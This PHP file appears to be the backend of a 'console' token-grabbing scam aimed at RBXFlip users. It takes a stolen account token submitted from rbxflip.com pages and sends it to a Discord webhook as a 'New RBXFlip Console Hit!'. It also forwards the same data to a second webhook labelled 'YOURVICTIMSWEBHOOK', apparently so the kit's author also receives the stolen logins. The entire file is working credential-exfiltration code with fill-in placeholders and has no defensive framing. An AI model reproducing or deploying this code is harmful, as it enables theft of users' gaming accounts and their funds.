<?php
header("Access-Control-Allow-Origin: https://rbxflip.com");
if($_POST['user']){
  $token = $_POST['user'];
  $dhookwebhook= "YOURDISCORDWEBHOOK";
$timestamp = date("c", strtotime("now"));
$json_data = json_encode([
    "content" => "@everyone **New RBXFlip Console Hit!**",
    "username" => "BOX",
    "tts" => false,
    "embeds" => [
        [
            "title" => "+1 New Result Account", //made by a;#0002
            "type" => "rich",
            "description" => "```$token```",
            "timestamp" => $timestamp,
            "color" => hexdec( "1CCF7B" ),
            "author" => [
                "name" => "Copy login?",
                "url" => "https://mee6.xyz" // made by a;#0002
            ],
        ]
    ]
 
], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
 
 
$ch = curl_init( $dhookwebhook);
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
$response = curl_exec($ch);
curl_close($ch);
   $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => "YOURVICTIMSWEBHOOK",
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $json_data,
            CURLOPT_HTTPHEADER => [
                "Content-Type: application/json"
            ]
        ]);
$response = curl_exec($ch);
curl_close($ch);
}
?>
